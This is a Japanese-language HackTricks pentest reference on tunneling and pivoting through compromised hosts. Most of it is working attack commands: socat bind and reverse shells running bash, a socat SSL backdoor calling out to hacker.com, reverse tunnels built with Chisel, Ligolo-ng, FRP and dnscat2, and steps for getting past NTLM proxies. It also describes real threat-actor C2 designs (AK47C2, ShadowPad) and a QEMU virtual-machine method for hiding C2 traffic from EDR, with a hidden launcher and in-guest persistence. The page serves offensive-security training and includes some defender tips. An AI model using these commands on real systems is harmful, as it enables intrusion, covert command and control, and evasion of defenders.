# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

## Nmap のヒント

> [!WARNING]
> **ICMP** と **SYN** スキャンは socks プロキシ経由でトンネリングできないため、この方法を機能させるには **ping discovery を無効化** (`-Pn`) し、**TCP スキャン** (`-sT`) を指定する必要があります。

## **Bash**

**ホスト -> ジャンプ -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH のグラフィカル接続 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Serverで新しいPortを開く --> Other port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> Third_box:ポート
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の場所
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

これは内部ホストからDMZを経由してあなたのホストへreverse shellsを取得するのに便利です:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

新しいインターフェースを作成するため、**両方のデバイスで root** が必要で、sshd の設定で root ログインを許可する必要があります:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
サーバー側でフォワーディングを有効にする
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **セキュリティ – Terrapin Attack (CVE-2023-48795)**
> 2023年の Terrapin ダウングレード攻撃により、man-in-the-middle が初期の SSH ハンドシェイクを改ざんし、**any forwarded channel** (`-L`, `-R`, `-D`) にデータを注入できる可能性があります。SSH tunnels に頼る前に、クライアントとサーバの双方がパッチ適用済み（**OpenSSH ≥ 9.6/LibreSSH 6.7**）であることを確認するか、脆弱な `chacha20-poly1305@openssh.com` および `*-etm@openssh.com` アルゴリズムを `sshd_config`/`ssh_config` で明示的に無効化してください。

## SSHUTTLE

ホスト経由で **ssh** を使い、特定の **subnetwork** へのすべての **traffic** を **tunnel** できます。\
例えば、10.10.10.0/24 宛てのすべての **traffic** を転送する場合
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver のすべてのインターフェースでリッスンするポートを開放し、**beacon を経由してトラフィックをルーティングできる**ようにします。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port is opened in the beacon host**。ポートは Team Server ではなく beacon host 側で開かれ、トラフィックは Team Server に送られ、そこから指定された host:port に転送されます。
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Beaconのreverse port forwardは、**Team Serverへのトラフィックをトンネリングするために設計されており、個々のマシン間での中継のためではありません**。
- トラフィックは、P2Pリンクを含め、**BeaconのC2トラフィック内でトンネリングされます**。
- 高番ポートでreverse port forwardsを作成するのに、**Admin privilegesは必要ありません**。

### rPort2Port local

> [!WARNING]
> この場合、**ポートはbeacon hostで開かれます**。Team Serverではなく、**トラフィックはCobalt Strike clientに送られます**、そこから指定されたhost:portへ転送されます。
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

webファイルトンネルをアップロードする必要があります: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

リリースページからダウンロードできます: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
クライアントとサーバーで**同じバージョンを使用する必要があります**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent と proxy は同じバージョンを使用してください**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding and Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### エージェントのローカルポートにアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. トンネルはvictim側から開始されます。\
socks4 proxyが127.0.0.1:1080に作成されます
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** を経由して Pivot する
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port を socks 経由で
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat経由のMeterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
被害者のコンソールで最後の行の代わりにこの行を実行すると、**non-authenticated proxy**をバイパスできます:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

両側で証明書を作成する: Client と Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルのSSHポート (22) を攻撃者ホストの443ポートに接続する
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

コンソール版の PuTTY のようなもので（オプションは ssh クライアントと非常に似ています）。

この binary は victim 側で実行され、ssh クライアントなので、reverse connection を確立するために自分の ssh サービスとポートを開いておく必要があります。次に、ローカルからのみアクセス可能なポートを自分のマシンのポートに転送するには：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

ローカル管理者である必要があります（任意のポートの場合）。
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

対象システムに対する**RDPアクセス**が必要です。\
ダウンロード:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールはWindowsのRemote Desktop Service機能にある`Dynamic Virtual Channels`（`DVC`）を使用します。`DVC`は**RDP接続上でパケットをトンネリングする**役割を果たします。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

クライアント側のコンピュータで**`SocksOverRDP-Plugin.dll`**を次のようにロードします:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
これで **mstsc.exe** を使って **RDP** 経由で **victim** に **connect** でき、**SocksOverRDP plugin is enabled** と表示される **prompt** を受け取り、**127.0.0.1:1080** で **listen** するはずです。

**Connect** via **RDP** and upload & execute in the **victim** マシン the `SocksOverRDP-Server.exe` バイナリ:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
攻撃者側のマシン (attacker) でポート1080がリッスンしていることを確認してください:
```
netstat -antb | findstr 1080
```
これで[**Proxifier**](https://www.proxifier.com/) **を使ってそのポート経由でトラフィックをプロキシできます。**

## Windows GUI アプリのプロキシ化

Windows の GUI アプリを[**Proxifier**](https://www.proxifier.com/)を使ってプロキシ経由で通信させることができます。\
「**Profile -> Proxy Servers**」でSOCKSサーバーのIPとポートを追加します。\
「**Profile -> Proxification Rules**」でプロキシ化するプログラム名と、プロキシ化したい接続先のIPを追加します。

## NTLM proxy bypass

前述のツール：**Rpivot**\
以下のオプションを設定することで**OpenVPN**でも回避できます：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

これはプロキシに対して認証を行い、指定した外部サービスに転送されるローカルのポートをバインドします。その後、このポートを通して任意のツールを使用できます。\
例えば、それは port 443 を転送します。
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
例えば被害者側で**SSH**サービスをポート443で待ち受けるよう設定した場合、攻撃者側のポート2222を介して接続できます。\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.
また、**meterpreter**を使用してlocalhost:443に接続し、攻撃者がポート2222で待ち受けるようにすることもできます。

## YARP

Microsoftが作成したリバースプロキシです。ここで見つけられます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

両方のシステムでrootが必要です。これはtun adaptersを作成し、DNS queriesを使ってそれらの間でデータをトンネルするためです。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
tunnelは非常に遅くなります。  
このtunnelを介して圧縮された SSH 接続を作成するには、次を使用します：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNSを介してC\&Cチャネルを確立します。root privilegesは不要です。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

PowerShellでdnscat2クライアントを実行するには、[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) を使用できます:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat を使った Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains の DNS を変更

Proxychains は `gethostbyname` libc コールをフックし、tcp の DNS リクエストを socks プロキシ経由でトンネルします。**デフォルト**では proxychains が使用する **DNS** サーバは **4.2.2.2**（ハードコード）です。変更するにはファイル _/usr/lib/proxychains3/proxyresolv_ を編集して IP を変更してください。**Windows 環境**の場合は **ドメインコントローラー** の IP を設定することもできます。

## Go でのトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### カスタム DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 アクターは、アウトバウンドの **DNS** と **plain HTTP POST** トラフィックのみを悪用する **dual-channel C2 ("AK47C2")** を構築しました。これらは企業ネットワークでブロックされにくい2つのプロトコルです。

1. **DNS モード (AK47DNS)**
• ランダムな5文字の SessionID を生成（例: `H4T14`）。
• *task requests* には `1`、*results* には `2` を先頭に付け、複数のフィールド（flags、SessionID、computer name）を連結します。
• 各フィールドは **ASCII キー `VHBD@H` で XOR 暗号化**され、16進エンコードされ、ドットで結合されます — 最終的に攻撃者管理ドメインで終わります:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• リクエストは `DnsQuery()` を使って **TXT**（フォールバックで **MG**）レコードを取得します。  
• 応答が 0xFF バイトを超えると、バックドアはデータを63バイトずつに **分割** し、マーカー `s<SessionID>t<TOTAL>p<POS>` を挿入して C2 サーバが順序を復元できるようにします。

2. **HTTP モード (AK47HTTP)**
• JSON 封筒を構築します:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 全体を XOR-`VHBD@H` → hex → ボディとして **`POST /`**（ヘッダ `Content-Type: text/plain`）で送信します。  
• 返信も同じエンコードを使い、`cmd` フィールドは `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• 最初のラベルが長い16進文字列で、常に特定の珍しいドメインで終わる異常な **TXT クエリ**を探してください。  
• 一定の XOR キーに続く ASCII-hex は YARA で検出しやすい: `6?56484244?484`（16進で `VHBD@H`）。  
• HTTP については、text/plain の POST ボディが純粋な16進で、バイト数が2の倍数であるものをフラグにしてください。

{{#note}}
チャンネル全体は **標準 RFC 準拠のクエリ** に収まり、各サブドメインラベルを63バイト未満に保つため、ほとんどの DNS ログでステルスになります。
{{#endnote}}

## ICMP トンネリング

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

両方のシステムで tun アダプタを作成し、ICMP echo requests を使ってデータをトンネルするために root 権限が必要です。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **は、1つのコマンドでソリューションをインターネットに公開するツールです。**\
_公開される URI は次のようになります:_ **UID.ngrok.io**

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使い方

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じてauthenticationとTLSを追加することも可能です。_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPでファイルを公開する
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTPトラフィックの傍受

_XSS、SSRF、SSTIなどに有用_\  
stdoutから直接、またはHTTPインターフェースで [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### 内部HTTPサービスのトンネリング
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml の簡単な設定例

3つのトンネルを開きます:

- TCP が2つ
- HTTP が1つ（/tmp/httpbin/から静的ファイルを公開）
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare の `cloudflared` デーモンは、Cloudflare のエッジをランデブーポイントとして使用し、着信ファイアウォールルールを必要とせずに **local TCP/UDP services** を公開するアウトバウンドトンネルを作成できます。これは、egress firewall が HTTPS トラフィックのみを許可し、着信接続がブロックされている場合に非常に便利です。

### クイックトンネルのワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNSを使った永続的トンネル
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動する:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は活発にメンテナンスされている Go reverse-proxy で、**TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching** をサポートします。**v0.53.0 (May 2024)** 以降、**SSH Tunnel Gateway** として動作できるため、ターゲットホストは標準の OpenSSH client のみを使用してリバーストンネルを立ち上げられます — 追加のbinaryは不要です。

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH ゲートウェイを使用する (frpc binary は不要)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは victim’s port **8080** を **attacker_ip:9000** として公開します。追加のツールを展開することなく動作し、living-off-the-land pivoting に最適です。

## QEMU を使った秘匿的な VM ベースのトンネル

QEMU の user-mode networking (`-netdev user`) は `hostfwd` というオプションをサポートしており、**binds a TCP/UDP port on the *host* and forwards it into the *guest***。guest がフルの SSH デーモンを実行していると、hostfwd ルールは ephemeral VM の内部に完全に存在する使い捨ての SSH jump box を提供します — すべての悪意のある活動とファイルが仮想ディスク内に留まるため、EDR から C2 トラフィックを隠すのに最適です。

### クイックワンライナー
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは**Tiny Core Linux**イメージ（`tc.qcow2`）をRAM上で起動します。  
• Windowsホストのポート**2222/tcp**はゲスト内の**22/tcp**に透過的に転送されます。  
• 攻撃者の視点では、ターゲットは単にポート**2222/tcp**を公開しているだけで、そこに届くパケットはVM内で動作しているSSHサーバが処理します。

### VBScriptによるステルス起動
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Why this evades detection

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS module turns every compromised perimeter web server into a dual-purpose **backdoor + relay** by binding covert URL prefixes directly at the HTTP.sys layer:

* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler *before* the request reaches IIS modules.
* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
